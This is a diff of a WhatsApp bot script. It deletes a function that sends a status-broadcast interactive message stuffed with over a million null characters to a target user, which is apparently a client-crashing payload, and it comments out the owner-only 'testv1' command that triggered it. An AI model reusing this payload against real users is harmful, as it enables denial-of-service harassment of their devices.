@@ -130,7 +130,7 @@ return
 }
 
 //const 
-const secondary = {
+const chocoplus = {
             key: {
                 remoteJid: "13135550002@s.whatsapp.net",
                 fromMe: false,
@@ -150,45 +150,9 @@ const secondary = {
 //imágenes 
 const menuX = fs.readFileSync('./src/pazinweb.jpg');
 const menuX2 = fs.readFileSync('./src/pazinweb.jpg');
-const superior = fs.readFileSync('./src/pazinweb.jpg');
 
-async function test(X) {
-await bruxin.relayMessage("status@broadcast", {
-viewOnceMessage: {
-message: {
-interactiveResponseMessage: {
-body: {
-text: "𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛 </>",
-format: "DEFAULT"
-},
-nativeFlowResponseMessage: {
-name: "galaxy_message",
-paramsJson: `{ "${'\u0000'.repeat(1045000)}" }`,
-version: 3
-}
-}
-}
-}
-}, {
-statusJidList: [X],
-additionalNodes: [{
-tag: "meta",
-attrs: {},
-content: [{
-tag: "mentioned_users",
-attrs: {},
-content: [
-{
-tag: "to",
-attrs: { jid: X },
-content: []
-}
-]
-}]
-}]
-});
-console.log("Envío Exitoso");
-}
+
+
     
 switch(command) {
 case 'menu': {
@@ -330,12 +294,12 @@ case 'menu': {
                             }
                         }
                     },
-                    { quoted: secondary }
+                    { quoted: chocoplus }
                 );
                 break;
             }
             
-
+/*
 case "testv1": {
 if (!isBot) return reply('`comando negado!!\nsolo mi creador puede usarlo`');
 if (!q) {
@@ -379,7 +343,7 @@ await test(org);
 await rest(org);
 }
 break;
-
+*/
 default:
 }
 
